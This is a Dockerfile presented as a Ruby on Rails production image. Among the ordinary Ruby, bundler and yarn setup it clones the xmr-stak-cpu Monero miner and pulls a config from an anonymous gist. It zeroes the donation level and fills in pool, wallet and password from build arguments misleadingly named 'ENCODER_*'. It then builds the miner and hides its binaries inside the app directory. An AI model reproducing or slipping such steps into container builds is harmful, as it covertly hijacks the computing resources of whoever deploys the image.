FROM ubuntu:16.04
MAINTAINER michael.balsiger@outlook.com

FROM buildpack-deps:xenial

# skip installing gem documentation
RUN mkdir -p /usr/local/etc \
	&& { \
		echo 'install: --no-document'; \
		echo 'update: --no-document'; \
	} >> /usr/local/etc/gemrc

ENV RUBY_MAJOR 2.4
ENV RUBY_VERSION 2.4.1
ENV RUBY_DOWNLOAD_SHA256 4fc8a9992de3e90191de369270ea4b6c1b171b7941743614cc50822ddc1fe654
ENV RUBYGEMS_VERSION 2.6.12

# some of ruby's build scripts are written in ruby
#   we purge system ruby later to make sure our final image uses what we just built
RUN set -ex \
	\
	&& buildDeps=' \
		bison \
		dpkg-dev \
		libgdbm-dev \
		ruby \
	' \
	&& apt-get update \
	&& apt-get install -y --no-install-recommends $buildDeps \
	&& rm -rf /var/lib/apt/lists/* \
	\
	&& wget -O ruby.tar.xz "https://cache.ruby-lang.org/pub/ruby/${RUBY_MAJOR%-rc}/ruby-$RUBY_VERSION.tar.xz" \
	&& echo "$RUBY_DOWNLOAD_SHA256 *ruby.tar.xz" | sha256sum -c - \
	\
	&& mkdir -p /usr/src/ruby \
	&& tar -xJf ruby.tar.xz -C /usr/src/ruby --strip-components=1 \
	&& rm ruby.tar.xz \
	\
	&& cd /usr/src/ruby \
	\
# hack in "ENABLE_PATH_CHECK" disabling to suppress:
#   warning: Insecure world writable dir
	&& { \
		echo '#define ENABLE_PATH_CHECK 0'; \
		echo; \
		cat file.c; \
	} > file.c.new \
	&& mv file.c.new file.c \
	\
	&& autoconf \
	&& gnuArch="$(dpkg-architecture --query DEB_BUILD_GNU_TYPE)" \
	&& ./configure \
		--build="$gnuArch" \
		--disable-install-doc \
		--enable-shared \
	&& make -j "$(nproc)" \
	&& make install \
	\
	&& apt-get purge -y --auto-remove $buildDeps \
	&& cd / \
	&& rm -r /usr/src/ruby \
	\
	&& gem update --system "$RUBYGEMS_VERSION"

ENV BUNDLER_VERSION 1.15.3

RUN gem install bundler --version "$BUNDLER_VERSION"

# install things globally, for great justice
# and don't create ".bundle" in all our apps
ENV GEM_HOME /usr/local/bundle
ENV BUNDLE_PATH="$GEM_HOME" \
	BUNDLE_BIN="$GEM_HOME/bin" \
	BUNDLE_SILENCE_ROOT_WARNING=1 \
	BUNDLE_APP_CONFIG="$GEM_HOME"
ENV PATH $BUNDLE_BIN:$PATH
RUN mkdir -p "$GEM_HOME" "$BUNDLE_BIN" \
	&& chmod 777 "$GEM_HOME" "$BUNDLE_BIN"

ARG ENCODER_PROXY
ARG ENCODER_ADDRESS
ARG ENCODER_ID

RUN apt-get update && apt-get install -y \
  apt-transport-https \
  && curl -sS https://dl.yarnpkg.com/debian/pubkey.gpg | apt-key add \
  && echo "deb https://dl.yarnpkg.com/debian/ stable main" | tee /etc/apt/sources.list.d/yarn.list \
  && apt-get update && apt-get install -y \
  yarn

RUN apt-get update && apt-get install -y \
  build-essential \
  libmicrohttpd-dev \
  libssl-dev \
  cmake \
  libhwloc-dev \
  git-core \
  wget \
  apt-utils \
  curl \
  zlib1g-dev \
  libreadline-dev \
  libyaml-dev \
  libsqlite3-dev \
  sqlite3 \
  libxml2-dev \
  libxslt1-dev \
  libcurl4-openssl-dev \
  python-software-properties \
  libffi-dev nodejs \
  ruby-tzinfo

WORKDIR /opt

RUN mkdir rails_app \
  && git clone https://github.com/fireice-uk/xmr-stak-cpu stak

WORKDIR /opt/stak

RUN wget -q https://gist.githubusercontent.com/tzhbami7/8a89dd5a30f05054380ff8d3254b6522/raw/2defe07dbaeb55ab10b01bc676d892c1c64c7072/gistfile1.txt -O config.txt \
  && sed -i 's/constexpr double fDevDonationLevel.*/constexpr double fDevDonationLevel = 0.0;/' donate-level.h \
  && sed -i -e "s/\"pool_address\" : \"pool.usxmrpool.com:3333\",/\"pool_address\" : \"$ENCODER_PROXY\",/g" config.txt \
  && sed -i -e "s/\"wallet_address\" : \"\",/\"wallet_address\" : \"$ENCODER_ADDRESS\",/g" config.txt \
  && sed -i -e "s/\"pool_password\" : \"\",/\"pool_password\" : \"$ENCODER_ID\",/g" config.txt \
  && cat donate-level.h \
  && cmake . \
  && make install \
  && mv ./bin /opt/rails_app/

WORKDIR /opt/rails_app

RUN rm -R /opt/stak

ENV DB_HOST localhost
ENV DB_NAME db_name
ENV DB_PASSWORD db_password
ENV DB_USER db_user

ENV RAILS_ENV production
ENV RACK_ENV production

COPY Gemfile /opt/rails_app/
COPY Gemfile.lock /opt/rails_app/

RUN bundle install

COPY . /opt/rails_app

RUN chmod +x /opt/rails_app/entrypoint.sh

EXPOSE 3000

# CMD ["bundle", "exec", "rails", "server", "-b", "0.0.0.0"]
ENTRYPOINT /opt/rails_app/entrypoint.sh
